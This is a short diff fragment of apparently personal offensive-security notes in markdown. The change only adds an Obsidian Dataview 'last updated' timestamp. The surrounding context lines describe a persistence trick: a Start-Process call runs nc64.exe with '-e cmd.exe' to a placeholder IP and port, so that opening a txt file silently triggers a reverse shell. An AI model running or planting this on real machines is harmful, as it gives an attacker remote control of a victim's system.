@@ -44,3 +44,6 @@ Start-Process -NoNewWindows "c:\tools\nc64.exe" "-e cmd.exe <IP> <PORT>"
 C:\Windows\System32\Notepad.exe $args[0]
 ```
 - Opening a txt file will now trigger the reverse shell
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
